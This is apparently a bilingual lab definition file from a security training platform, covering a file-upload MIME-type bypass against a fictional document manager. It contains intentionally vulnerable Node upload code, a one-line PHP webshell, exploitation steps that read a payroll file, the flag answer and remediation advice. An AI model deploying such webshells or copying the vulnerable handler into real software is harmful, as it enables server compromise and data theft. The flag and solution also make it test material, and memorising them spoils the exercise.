// src/modules/practice-labs/file-upload/labs/lab2/lab2.metadata.ts
import type { LabMetadata } from '../../../types/lab-metadata.type';

export const fuLab2Metadata: LabMetadata = {
  slug: 'fu-mime-type-bypass-document-manager',
  title: 'File Upload: MIME Type Bypass — Document Manager Webshell',
  ar_title: 'رفع الملفات: تجاوز MIME Type — Webshell في مدير المستندات',
  description:
    'Exploit a file upload vulnerability where the server validates only the Content-Type header sent by the client. Override the MIME type in the request to "image/jpeg" while uploading a PHP webshell — the server trusts the client-supplied header completely.',
  ar_description:
    'استغل ثغرة رفع ملفات حيث يتحقق الخادم فقط من Content-Type header المرسل من العميل. غيّر MIME type في الطلب إلى "image/jpeg" مع رفع PHP webshell — الخادم يثق بالـ header بالكامل.',
  difficulty: 'INTERMEDIATE',
  category: 'WEB_SECURITY',
  skills: [
    'File Upload',
    'MIME Bypass',
    'Content-Type Manipulation',
    'Client-Side Validation Bypass',
  ],
  xpReward: 220,
  pointsReward: 110,
  duration: 35,
  executionMode: 'SHARED_BACKEND',
  isPublished: true,

  // ─── للمتدرب ────────────────────────────────────────────────────
  goal: 'DocuVault checks Content-Type header but not actual file content. Send a PHP webshell with Content-Type: image/jpeg to bypass validation. Then execute the webshell to read /var/app/confidential/payroll.txt.',
  ar_goal:
    'DocuVault يتحقق من Content-Type header لكن ليس من محتوى الملف الفعلي. أرسل PHP webshell مع Content-Type: image/jpeg لتجاوز التحقق. ثم نفّذ الـ webshell لقراءة /var/app/confidential/payroll.txt.',

  briefing: {
    en: `DocuVault — document management system. Upload reports, PDFs, images.
POST /docs/upload — multipart form data.
Backend validation:
const mimeType = req.file.mimetype;
const allowed  = ['image/jpeg', 'image/png', 'application/pdf'];
if (!allowed.includes(mimeType)) → reject.
Where does req.file.mimetype come from?
From the HTTP request.
The Content-Type field in the multipart body.
Which is set by the CLIENT.
By you.
You set it.
You control it.
Upload shell.php with Content-Type: image/jpeg.
req.file.mimetype = "image/jpeg"
allowed.includes("image/jpeg") = true
Validation passes.
Server stores shell.php on disk.
As shell.php — because the filename is also yours.
The actual PHP file is now on the server.
Execute it.`,
    ar: `DocuVault — نظام إدارة مستندات. ارفع تقارير، PDFs، صور.
POST /docs/upload — multipart form data.
التحقق في الـ backend:
const mimeType = req.file.mimetype;
const allowed  = ['image/jpeg', 'image/png', 'application/pdf'];
if (!allowed.includes(mimeType)) → رفض.
من أين يأتي req.file.mimetype؟
من طلب HTTP.
حقل Content-Type في جسم الـ multipart.
الذي يضبطه العميل.
أنت.
أنت تضبطه.
أنت تتحكم فيه.
ارفع shell.php مع Content-Type: image/jpeg.
req.file.mimetype = "image/jpeg"
allowed.includes("image/jpeg") = true
التحقق يمر.
الخادم يحفظ shell.php على القرص.
كـ shell.php — لأن اسم الملف أيضاً لك.
ملف PHP الفعلي موجود الآن على الخادم.
نفّذه.`,
  },

  stepsOverview: {
    en: [
      'POST /docs/upload { "filename": "report.php", "mimeType": "application/x-php" } — expect rejection',
      'Resend with { "filename": "report.php", "mimeType": "image/jpeg", "fileContent": "<?php system(...)" } — bypasses MIME check',
      'Receive URL: "/uploads/report.php"',
      'POST /docs/execute { "filename": "report.php", "cmd": "id" } → "uid=33(www-data)" — RCE confirmed',
      'POST /docs/execute { "filename": "report.php", "cmd": "cat /var/app/confidential/payroll.txt" } → FLAG',
    ],
    ar: [
      'POST /docs/upload { "filename": "report.php"، "mimeType": "application/x-php" } — توقع الرفض',
      'أعِد الإرسال مع { "filename": "report.php"، "mimeType": "image/jpeg"، "fileContent": "<?php system(...)" } — يتجاوز فحص MIME',
      'استلم URL: "/uploads/report.php"',
      'POST /docs/execute { "filename": "report.php"، "cmd": "id" } → "uid=33(www-data)" — تأكيد RCE',
      'POST /docs/execute { "filename": "report.php"، "cmd": "cat /var/app/confidential/payroll.txt" } → العلم',
    ],
  },

  // ─── للأدمن فقط ─────────────────────────────────────────────────
  solution: {
    context:
      'DocuVault validates req.file.mimetype which is derived from the Content-Type field of the multipart upload. This is fully attacker-controlled — Multer reads it from the HTTP headers without any server-side content inspection. By setting Content-Type: image/jpeg in the multipart part, req.file.mimetype becomes "image/jpeg" and passes the allowlist check — regardless of the actual file content.',
    vulnerableCode:
      "// Document upload (vulnerable — trusts Content-Type):\napp.post('/docs/upload', upload.single('file'), (req, res) => {\n" +
      '  const mimeType = req.file.mimetype; // ❌ From HTTP header — attacker-controlled!\n' +
      "  const allowed  = ['image/jpeg', 'image/png', 'application/pdf'];\n" +
      '  if (!allowed.includes(mimeType)) {\n' +
      "    return res.status(400).json({ error: 'Invalid file type' });\n" +
      '  }\n' +
      "  fs.writeFileSync('/uploads/' + req.file.originalname, req.file.buffer);\n" +
      "  res.json({ success: true, url: '/uploads/' + req.file.originalname });\n" +
      '});',
    exploitation:
      'POST /docs/upload:\n' +
      '  filename: "shell.php"\n' +
      '  mimeType: "image/jpeg"  ← attacker sets this\n' +
      '  fileContent: "<?php system($_GET[\'cmd\']); ?>"\n' +
      '→ mimeType check passes → shell.php written to /uploads/\n' +
      '→ Execute: { "cmd": "cat /var/app/confidential/payroll.txt" } → FLAG',
    steps: {
      en: [
        'POST /docs/upload { "filename": "shell.php", "mimeType": "application/x-php" } → 400 "Invalid file type"',
        'POST /docs/upload { "filename": "shell.php", "mimeType": "image/jpeg", "fileContent": "system($_GET[\'cmd\'])" } → 200 { "url": "/uploads/shell.php" }',
        'POST /docs/execute { "filename": "shell.php", "cmd": "id" } → "uid=33(www-data)" — RCE confirmed',
        'POST /docs/execute { "filename": "shell.php", "cmd": "cat /var/app/confidential/payroll.txt" } → FLAG{FILE_UPLOAD_MIME_TYPE_BYPASS_CLIENT_CONTROLLED_HEADER}',
      ],
      ar: [
        'POST /docs/upload { "filename": "shell.php"، "mimeType": "application/x-php" } → 400 "Invalid file type"',
        'POST /docs/upload { "filename": "shell.php"، "mimeType": "image/jpeg"، "fileContent": "system($_GET[\'cmd\'])" } → 200 { "url": "/uploads/shell.php" }',
        'POST /docs/execute { "filename": "shell.php"، "cmd": "id" } → "uid=33(www-data)" — تأكيد RCE',
        'POST /docs/execute { "filename": "shell.php"، "cmd": "cat /var/app/confidential/payroll.txt" } → FLAG{FILE_UPLOAD_MIME_TYPE_BYPASS_CLIENT_CONTROLLED_HEADER}',
      ],
    },
    fix: [
      'Never trust Content-Type: use server-side MIME detection — read file magic bytes with mmmagic or file-type npm package',
      'Allowlist extension + MIME: both must match; a .jpg with PHP magic bytes should be rejected',
      'Rename files on upload: UUID + safe extension — user controls neither filename nor path',
      'Serve from S3/CDN with no execution: even if a PHP file is uploaded, it cannot be executed',
    ],
  },

  postSolve: {
    explanation: {
      en: 'The Content-Type header in an HTTP multipart upload is completely client-controlled. The browser sets it automatically based on the file extension — but an attacker can set it to anything using Burp Suite, curl, or a custom HTTP client. Server-side MIME detection must use the actual file content: read the first 512 bytes, check magic bytes (JPEG: FF D8 FF, PNG: 89 50 4E 47, PDF: 25 50 44 46). Libraries like mmmagic (Node.js) or python-magic do this automatically.',
      ar: 'الـ Content-Type header في رفع multipart HTTP يتحكم فيه العميل بالكامل. المتصفح يضبطه تلقائياً بناءً على امتداد الملف — لكن يمكن للمهاجم ضبطه لأي شيء باستخدام Burp Suite أو curl أو HTTP client مخصص. يجب أن يستخدم اكتشاف MIME على الخادم محتوى الملف الفعلي: اقرأ أول 512 byte، تحقق من magic bytes (JPEG: FF D8 FF، PNG: 89 50 4E 47، PDF: 25 50 44 46). مكتبات مثل mmmagic (Node.js) أو python-magic تفعل ذلك تلقائياً.',
    },
    impact: {
      en: 'payroll.txt reveals: executive salary data (CEO $450K, CTO $380K) and the FLAG. This constitutes a critical data breach — HR/payroll data is PII and may be subject to GDPR. The webshell also provides full RCE: read all confidential documents, access database credentials, establish persistent access, and exfiltrate all corporate data.',
      ar: 'يكشف payroll.txt عن: بيانات رواتب المديرين التنفيذيين (CEO $450K، CTO $380K) والـ FLAG. يُشكّل هذا اختراقاً حرجاً للبيانات — بيانات HR/كشوف الرواتب هي PII وقد تخضع لـ GDPR. يوفر الـ webshell أيضاً RCE كاملاً: قراءة جميع الوثائق السرية، الوصول لبيانات اعتماد قاعدة البيانات، إنشاء وصول دائم، وتسريب جميع بيانات الشركة.',
    },
    fix: [
      'Server-side magic bytes check: const type = await fileTypeFromBuffer(buffer); if (!["image/jpeg","image/png"].includes(type?.mime)) reject',
      'Double validation: extension allowlist AND magic bytes must both match',
      'File processing pipeline: run uploaded file through image re-encoding (sharp) — a PHP file cannot survive JPEG re-encoding',
      'Storage isolation: never serve uploads from the same domain/server that runs PHP',
    ],
  },

  hints: [
    {
      order: 1,
      xpCost: 15,
      content:
        'The server checks "Content-Type" header — but who sends that header? The CLIENT (you). In a multipart upload, the Content-Type for each part is set by the browser... or by you directly. What if you send Content-Type: image/jpeg but the file content is PHP?',
    },
    {
      order: 2,
      xpCost: 30,
      content:
        'POST /docs/upload with { "filename": "report.php", "mimeType": "image/jpeg", "fileContent": "webshell" }. The mimeType parameter maps to req.file.mimetype — the server trusts it completely.',
    },
    {
      order: 3,
      xpCost: 55,
      content:
        'The server validates mimeType ("image/jpeg" passes) but stores the file as "report.php" — a PHP file. Once uploaded, use /docs/execute to run commands through it.',
    },
    {
      order: 4,
      xpCost: 70,
      content:
        'POST /docs/execute { "filename": "shell.php", "cmd": "cat /var/app/confidential/payroll.txt" } to read the sensitive payroll file containing the flag.',
    },
  ],

  flagAnswer: 'FLAG{FILE_UPLOAD_MIME_TYPE_BYPASS_CLIENT_CONTROLLED_HEADER}',
  initialState: {
    contents: [
      {
        title: 'PAYROLL_TXT',
        body: 'PAYROLL Q1 2024\n================\nCEO: $450,000\nCTO: $380,000\nFLAG: FLAG{FILE_UPLOAD_MIME_TYPE_BYPASS_CLIENT_CONTROLLED_HEADER}',
        author: 'system_file',
        isPublic: false,
      },
    ],
  },
};
